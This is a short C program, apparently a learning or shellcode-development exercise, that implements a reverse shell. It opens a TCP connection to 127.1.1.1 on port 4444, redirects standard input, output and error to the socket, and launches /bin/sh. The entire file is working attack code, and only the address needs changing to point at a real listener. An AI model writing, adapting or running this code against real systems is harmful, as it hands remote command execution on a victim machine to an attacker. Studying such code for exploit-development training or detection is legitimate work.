#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{
	//create a socket
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	
	struct sockaddr_in client_addr;
  client_addr.sin_family = AF_INET;
	
	//set port
	client_addr.sin_port = htons(4444);

	//set IP address to connect
	client_addr.sin_addr.s_addr = inet_addr("127.1.1.1");
	
	
	//connects using the created sock to the properties set at client_addr
	connect(sock, (struct sockaddr *)&client_addr, sizeof(client_addr));
		
	//redirect std input,output and error to created socket
	dup2(sock,0);
	dup2(sock,1);
	dup2(sock,2);

	// spawn a shell
	execve("/bin/sh", NULL, NULL);

}
